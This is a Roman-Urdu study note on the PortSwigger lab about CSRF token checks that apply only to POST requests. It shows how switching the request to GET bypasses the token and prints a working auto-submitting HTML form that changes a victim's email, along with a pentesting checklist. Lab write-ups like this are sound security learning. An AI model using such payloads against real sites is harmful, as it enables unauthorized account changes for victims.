# 🛡️ CSRF Bypass via Request Method – Complete Note (Urdu Style)

## 🔬 Lab Title:

**CSRF where token validation depends on request method** – PortSwigger Academy

---

## 🧠 Hum ne kya seekha?

* Yeh lab batata hai ke **CSRF token check karna sirf POST requests pe kaafi nahi hota**
* Agar server **GET requests pe token ko ignore karta hai**, to attacker **token ki protection ko bypass** kar sakta hai

---

## 💡 Yeh kis tarah ki technique thi?

| Technique Type           | Explanation                                                                         |
| ------------------------ | ----------------------------------------------------------------------------------- |
| Method-based CSRF Bypass | Jab server CSRF token sirf POST pe check karta hai, lekin GET request pe nahi karta |
| Attack Style             | CSRF using GET method                                                               |

---

## 🚀 Step-by-Step Lab Solution (CSRF GET Bypass)

---

### ✅ Step 1: Login

* Open Burp's browser
* Login credentials:

  ```
  Username: wiener
  Password: peter
  ```

---

### ✅ Step 2: Email change karo

* “My account” page pe jao
* Email ko change karo (e.g. [test@csrf.com](mailto:test@csrf.com))
* Request Burp mein capture karo

---

### ✅ Step 3: Request analyze karo

```http
POST /my-account/change-email
csrf=ABC123
email=habib@csrf.com
```

* POST method use ho rahi hai
* `csrf` token bhi diya gaya hai

---

### ✅ Step 4: Test token in POST

* Burp Repeater mein request bhejo
* `csrf=` value galat karo
* Server response:

  ```
  Invalid CSRF token
  ```

✅ Matlab token verify ho raha hai

---

### ✅ Step 5: Method ko GET banao

* Repeater mein request ko GET karo:

```http
GET /my-account/change-email?email=habib@csrf.com&csrf=XYZ HTTP/1.1
```

* Send karo

✅ Agar email change ho gaya → CSRF token GET pe verify nahi ho raha
➡️ **Site vulnerable hai**

---

### ✅ Step 6: Exploit HTML banao

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@csrf123.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

* Email unique hona chahiye (wiener\@... na ho)
* HTML exploit server pe paste karo
* Click: Store → Deliver to Victim

🎉 Lab Solved

---

## 🧪 Real-World Pentesting Checklist

| ✅ Check                       | Explanation                               |
| ----------------------------- | ----------------------------------------- |
| State-changing request        | Jaise email/password change               |
| CSRF token present?           | Dekho token POST mein aa raha ya nahi     |
| Invalid token → request fail? | Agar haan, to protection present          |
| Convert to GET                | Kya GET request accept hoti hai?          |
| GET pe token check ho raha?   | Agar nahi ho raha → Bypass possible       |
| Exploit test karo             | HTML se form auto-submit hota hai ya nahi |

---

## ⚠️ Developer Ki Galti

| Galti                          | Natija                         |
| ------------------------------ | ------------------------------ |
| Sirf POST pe token check karna | GET se CSRF ho sakta hai       |
| CSRF token logic partial hai   | Attacker exploit kar sakta hai |

---

## 🧠 Teri Zuban Mein Summary:

> “Yeh bug is liye mila kyunki server sirf POST request pe CSRF token check kar raha tha — jab humne method ko GET mein badla, token ki value kuch bhi daal di, phir bhi server ne accept kar liya. Yeh hi CSRF GET Bypass tha.”

---

## ✅ End

Yeh technique kam log use karte hain — agar tu isko bug bounty mein try kare to achhi vulnerabilities mil sakti hain. Hamesha har form pe method ko GET bhi try karna na bhoolna.

